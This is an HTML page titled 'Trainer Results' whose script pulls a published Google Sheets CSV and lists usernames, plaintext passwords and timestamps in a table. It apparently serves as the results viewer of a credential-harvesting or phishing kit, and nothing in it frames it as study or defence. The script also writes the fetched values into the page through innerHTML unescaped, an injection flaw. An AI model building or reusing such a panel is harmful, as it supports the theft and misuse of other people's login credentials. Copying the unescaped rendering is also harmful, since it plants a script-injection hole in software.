<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Trainer Results</title>
  <style>
    body{font-family:Arial, sans-serif;padding:20px;background:#f9fafb;color:#333;}
    h1{color:#2b5e90;}
    table{border-collapse:collapse;width:100%;background:#fff;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
    th,td{border:1px solid #e5e7eb;padding:12px;text-align:left;font-size:14px;}
    th{background:#f3f4f6;font-weight:600;}
  </style>
</head>
<body>
  <h1>Trainer Results</h1>
  <table id="resultsTable">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Timestamp</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    async function loadResults(){
      try {
        const res = await fetch("https://docs.google.com/spreadsheets/d/e/2PACX-1vSuLy4oyOd32uVvtwYb3vpjdWSOf8WjievgXzHU0gfUGJOfoP9jZBp_3qPiOJuF29NQMpTpB6MXFSuc/pub?gid=0&single=true&output=csv");
        const text = await res.text();
        const rows = text.trim().split("\n").map(r=>r.split(","));
        const tbody = document.querySelector("#resultsTable tbody");
        tbody.innerHTML = "";
        rows.slice(1).forEach(r=>{
          const tr = document.createElement("tr");
          tr.innerHTML = `<td>${r[0]}</td><td>${r[1]}</td><td>${r[2]}</td>`;
          tbody.appendChild(tr);
        });
      } catch (err) {
        alert("⚠️ Could not load results.");
      }
    }
    loadResults();
  </script>
</body>
</html>
